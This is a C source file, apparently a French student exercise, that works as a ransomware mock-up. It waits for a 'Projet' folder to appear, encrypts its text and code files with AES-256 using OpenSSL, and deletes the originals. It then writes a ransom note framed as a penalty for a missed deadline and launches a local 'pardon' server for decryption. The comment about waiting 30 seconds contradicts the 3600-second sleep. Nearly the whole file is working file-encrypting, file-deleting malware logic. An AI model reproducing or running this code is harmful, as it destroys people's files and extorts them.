#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define BUFFER_SIZE 4096
#define PROJET_DIR "Projet"
#define CLE_FILE "cle.key"
#define IV_FILE "cle.iv"
#define RANCON_FILE "Projet/RANÇON.txt"

int extension_valide(const char *filename) {
    return strstr(filename, ".txt") || strstr(filename, ".md") || strstr(filename, ".c") || strstr(filename, ".h");
}

void chiffrer_fichier(const char *input, const char *output, unsigned char *key, unsigned char *iv) {
    FILE *in = fopen(input, "rb");
    FILE *out = fopen(output, "wb");
    if (!in || !out) { perror("Erreur fichiers"); return; }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, in)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out);
    }

    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    remove(input);
}

void generer_rancon() {
    FILE *f = fopen(RANCON_FILE, "w");
    fprintf(f,
    "#########################################\n"
    "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"
    "#########################################\n\n"
    "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
    "car la date limite de remise du projet a été dépassée.\n\n"
    "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"
    "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n"
    "de les rendre irrécupérables.\n\n"
    "────────────────────────────────────────\n\n"
    "✅ Pour récupérer vos fichiers :\n\n"
    "1. Lancez le programme `client_decrypt` disponible dans le dossier TP/.\n"
    "2. Connectez-vous au serveur à l'adresse : 127.0.0.1, port : 4242\n"
    "3. Envoyez une justification écrite (20 caractères minimum).\n"
    "4. Si vos excuses sont acceptées, vos fichiers seront déchiffrés automatiquement.\n\n"
    "────────────────────────────────────────\n"
    );
    fclose(f);
}

void generer_cle_iv(unsigned char *key, unsigned char *iv) {
    RAND_bytes(key, 32);
    RAND_bytes(iv, 16);

    FILE *fk = fopen(CLE_FILE, "wb"), *fv = fopen(IV_FILE, "wb");
    fwrite(key, 1, 32, fk);
    fwrite(iv, 1, 16, fv);
    fclose(fk); fclose(fv);
}

int main() {
    printf("[INFO] Surveillance du dossier '%s'...\n", PROJET_DIR);

    while (access(PROJET_DIR, F_OK) != 0)
        sleep(5);

    printf("[INFO] Dossier détecté : %s\n", PROJET_DIR);
    printf("[INFO] Attente de 30 secondes...\n");
    sleep(3600); // mettre 3600 pour 1h réelle

    unsigned char key[32], iv[16];
    generer_cle_iv(key, iv);

    DIR *dir = opendir(PROJET_DIR);
    struct dirent *entry;
    char input[256], output[256];

    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_REG && extension_valide(entry->d_name)) {
            sprintf(input, "%s/%s", PROJET_DIR, entry->d_name);
            sprintf(output, "%s.enc", input);
            printf("[INFO] Chiffrement : %s\n", entry->d_name);
            chiffrer_fichier(input, output, key, iv);
        }
    }
    closedir(dir);

    generer_rancon();
    printf("[OK] RANÇON.txt généré.\n");

    // Lancement automatique du serveur_pardon
    printf("[INFO] Lancement du serveur_pardon...\n");
    if (fork() == 0) {
        execl("./serveur_pardon", "./serveur_pardon", NULL);
        perror("[ERREUR] Lancement serveur_pardon");
        exit(EXIT_FAILURE);
    }

    printf("[OK] serveur_pardon lancé en tâche de fond.\n");

    return 0;
}
